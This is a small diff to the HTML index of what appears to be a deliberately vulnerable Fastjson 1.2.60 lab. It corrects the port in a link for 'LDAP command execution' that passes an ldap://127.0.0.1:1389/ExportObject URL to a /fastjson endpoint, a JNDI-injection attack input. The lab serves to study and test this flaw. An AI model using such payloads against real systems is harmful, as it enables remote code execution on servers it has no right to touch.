@@ -22,7 +22,7 @@
     </p>
 
     <p>LDAP 命令执行 
-    	<a target="_blank" href="/fastjson-1.2.60/fastjson?url=ldap://127.0.0.1:1399/ExportObject">/fastjson-1.2.60/fastjson?url=ldap://127.0.0.1:1389/ExportObject</a> 
+    	<a target="_blank" href="/fastjson-1.2.60/fastjson?url=ldap://127.0.0.1:1389/ExportObject">/fastjson-1.2.60/fastjson?url=ldap://127.0.0.1:1389/ExportObject</a> 
     </p>
   </body>
 </html>
